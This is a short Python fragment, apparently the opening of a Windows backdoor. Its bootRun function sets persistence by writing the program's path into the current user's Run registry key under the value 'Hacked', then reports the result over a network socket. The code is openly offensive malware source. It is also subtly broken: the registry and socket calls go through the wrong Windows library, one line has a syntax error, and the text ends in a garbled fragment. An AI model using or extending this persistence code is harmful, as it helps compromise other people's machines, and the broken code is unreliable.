import socket
import os
import subprocess
import ctypes
import sys
import threading

# Define  function for compatibility 
def bzero(p, size):
    pass

# Function to set persistence in Windows Registry
def bootRun():
    err = b"Failed\n"
    suc = b"Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
    path = ctypes.create_string_buffer(512)
    ctypes.windll.kernel32.GetModuleFileNameA(None, path, 512)

    try:
        key = ctypes.windll.kernel32.RegOpenKeyA(
            ctypes.c_uint32(0x80000001), ctypes.create_string_buffer(b"Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, 0x20006)
        if not key:
            ctypes.windll.kernel32.RegSetValueExA(key, b"Hacked", 0, 1, path, ctypes.sizeof(path))
            ctypes.windll.kernel32.RegCloseKey(key)
            return ctypes.windll.kernel32.send(sock, suc, len(suc), 0)
        ctypes.windll.kernel32.RegCloseKey(key)
    except:
        ctypes.windll.kernel32.send(sock err, len(err), 0)
  are even.clientHeight their
